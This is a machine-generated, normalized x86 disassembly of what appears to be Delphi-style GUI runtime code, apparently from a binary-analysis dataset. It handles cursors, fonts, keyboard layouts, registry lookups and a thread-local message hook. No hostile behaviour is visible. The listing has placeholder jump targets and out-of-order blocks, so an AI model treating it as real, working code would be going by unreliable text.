jne r-xdata
mov edx esp
mov eax edi
call sub_434aac
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403360
sub_451ed8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_451f9e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_435080
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_403f8c
mov eax [ ebp - 0x4 ]
call sub_40415c
push eax
mov eax [ ebp - 0x4 ]
call sub_40435c
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_435090
mov eax [ ebp - 0x4 ]
call sub_40415c
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43513c
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451fa5
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_44dd80
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_4044e8
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_451fc4
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43ad7c
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43a384
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_43a398
mov dl [ ebx + 0x57 ]
call sub_43502c
inc edi
dec esi
jne r-xdata
sub_452068
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_452098
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_4520c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41c4b8
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45246c
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_452478
mov eax ebx
call sub_452484
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_44e8a0
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f320
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f320
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f320
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_4528a4
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_452780
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_452780
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_452780
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_452220
push ebx
push esi
push edi
push ebp
call sub_4034d8
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403164
mov eax [ ebp + 0x88 ]
call sub_403164
mov eax [ ebp + 0x84 ]
call sub_403164
mov eax [ ebp + 0x54 ]
call sub_403164
mov eax [ ebp + 0x50 ]
call sub_403164
mov eax [ ebp + 0x4c ]
call sub_403164
mov eax [ ebp + 0x30 ]
call sub_403164
mov eax [ ebp + 0x34 ]
call sub_403164
mov eax [ ebp + 0x7c ]
call sub_403164
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403164
mov eax ebp
call sub_4524e0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_41c504
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4034c0
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_416b18
call sub_403164
inc edi
dec esi
jne r-xdata
sub_452398
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_4523e4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4169bc
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4169bc
mov eax [ rw-data ]
call sub_455170
sub_45241c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_416c5c
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_416c5c
mov eax [ rw-data ]
call sub_455170
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_43ce0c
sub_452484
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_45253c
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_4524e0
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_402754
mov ebx esi
test ebx ebx
jne r-xdata
sub_45253c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_402734
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_452564
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45270f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452716
lea eax [ ebp - 0x260 ]
call sub_403e9c
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403e9c
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_4186a8
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408af0
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_440570
test al al
je r-xdata
xor eax eax
push ebp
push sub_4526cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_40410c
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_40410c
sub_452780
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_454fe0
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_454d94
mov dl 0x1
mov eax [ rw-data ]
call sub_454d94
sub_4527ec
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_452814
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_4527ec
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406a08
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406990
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4528a4
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4529e9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_454d94
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41f6b0
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41f6b0
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_41f794
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41f6b0
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_41f6b0
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41f6b0
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_454d94
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_41f4f4
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_41f4f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4529f0
cmp [ rw-data ] 0x0
je r-xdata
sub_452a28
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_452a88
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_452bc4 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_452c38
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_452390
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_416b18
mov dl [ ebp - 0x1 ]
call sub_452a88
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_45237c
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4169bc
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_416b94
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_416b18
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_452a28
test al al
je r-xdata
inc esi
sub_452d84
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_452390
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_45237c
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_452ddc
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_452d84
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_452e56
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_452c38
pop ecx
push ebp
mov al 0x2
call sub_452c38
pop ecx
push ebp
mov al 0x3
call sub_452c38
pop ecx
push ebp
mov al 0x4
call sub_452c38
pop ecx
push ebp
mov al 0x5
call sub_452c38
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403164
retn
sub_452e64
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4529f8
xor eax eax
push ebp
push sub_452edd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452ddc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_452a00
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_452ef8
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403e9c
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_403ef0
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_452f50
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push j_sub_4035ec#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_45539c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_452fa4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_433984
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_455418
sub_453000
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4544b8
sub_453044
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_453000
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_452fa4
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_4530b8
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_453114
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_453144
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_45316c
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_453114
mov ebx eax
test bl bl
